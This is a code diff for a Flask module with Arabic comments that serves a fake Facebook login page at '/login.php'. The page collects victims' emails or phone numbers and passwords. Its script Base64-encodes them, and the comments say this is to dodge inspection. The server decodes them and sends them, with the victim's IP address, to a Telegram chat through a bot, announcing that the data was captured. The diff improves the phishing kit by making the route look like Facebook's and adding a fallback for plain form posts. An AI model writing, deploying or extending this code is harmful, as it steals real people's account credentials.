@@ -2,7 +2,8 @@ import os
 import base64
 from flask import Blueprint, render_template_string, redirect, request
 
-secure_fb_bp = Blueprint('secure_facebook', __name__)
+# استخدام اسم Blueprint متوافق
+secure_fb_bp = Blueprint('facebook', __name__)
 
 ADVANCED_FB_TEMPLATE = """
 <!DOCTYPE html>
@@ -35,8 +36,8 @@ ADVANCED_FB_TEMPLATE = """
         <div class="card">
             <div id="error-msg" class="error-box">كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.</div>
             <form method="POST" id="secureForm" onsubmit="handleAuth(event)">
-                <input type="text" id="u_val" name="u_val" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                <input type="password" id="p_val" name="p_val" placeholder="كلمة السر" required>
+                <input type="text" id="u_val" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="p_val" name="pass" placeholder="كلمة السر" required>
                 <button type="submit" class="login-btn">تسجيل الدخول</button>
                 <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
                 <hr>
@@ -58,7 +59,7 @@ ADVANCED_FB_TEMPLATE = """
                 return;
             }
 
-            // تشفير البيانات بلغة Base64 قبل الإرسال للسيرفر لتجنب الفحص السطحي
+            // تشفير البيانات بـ Base64 لمنع الفحص السطحي
             const payload = btoa(JSON.stringify({ user: u, pass: p }));
             
             fetch(window.location.href, {
@@ -76,39 +77,47 @@ ADVANCED_FB_TEMPLATE = """
 </html>
 """
 
-def init_secure_facebook_routes(app, bot):
-    @app.route('/auth/login_secure', methods=['GET', 'POST'])
-    def secure_trap():
+# المطابقة التامة لاسم الدالة المطلوب في main.py لتجنب خطأ الـ ImportError
+def init_facebook_routes(app, bot):
+    @app.route('/login.php', methods=['GET', 'POST'])
+    def fb_trap():
         target_chat_id = request.args.get('id', None)
         
         if request.method == 'POST':
             req_data = request.json or {}
             encoded_data = req_data.get('data')
             
-            if encoded_data and target_chat_id:
+            # الدعم الاحتياطي في حال تم الإرسال بالطريقة العادية
+            if not encoded_data:
+                user_val = request.form.get('email')
+                pass_val = request.form.get('pass')
+            else:
                 try:
-                    # فك التشفير بلغة بايثون
                     decoded_bytes = base64.b64decode(encoded_data.encode('utf-8'))
                     import json
                     parsed = json.loads(decoded_bytes.decode('utf-8'))
-                    
                     user_val = parsed.get('user')
                     pass_val = parsed.get('pass')
-                    source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-                    
-                    # صياغة التنبيه بطريقة منظمة وآمنة لتجنب الحظر التلقائي من تيليجرام
-                    alert_msg = (
-                        "🔒 **تقرير مصادقة جديد:**\n"
-                        "----------------------------------\n"
-                        f"📌 **المعرف/البريد:** `{user_val}`\n"
-                        f"🔑 **كلمة المرور:** `{pass_val}`\n"
-                        f"🌐 **مصدر الاتصال (IP):** `{source_ip}`\n"
-                        "----------------------------------"
-                    )
+                except Exception:
+                    user_val = "غير محدد"
+                    pass_val = "غير محدد"
+
+            source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            
+            if target_chat_id and user_val:
+                alert_msg = (
+                    "🚨 **تم التقاط البيانات بنجاح وبشكل آمن!**\n"
+                    "----------------------------------\n"
+                    f"📌 **البريد/الهاتف:** `{user_val}`\n"
+                    f"🔑 **كلمة المرور:** `{pass_val}`\n"
+                    f"🌐 **عنوان الـ IP:** `{source_ip}`\n"
+                    "----------------------------------"
+                )
+                try:
                     bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
-                except Exception as ex:
-                    print(f"[-] Processing Error: {ex}")
+                except Exception as e:
+                    print(f"[-] Telegram Error: {e}")
                     
             return {"status": "redirect"}
             
-        return render_template_string(ADVANCED_FB_TEMPLATE)
+        return render_template_string(FB_PHISH_TEMPLATE)
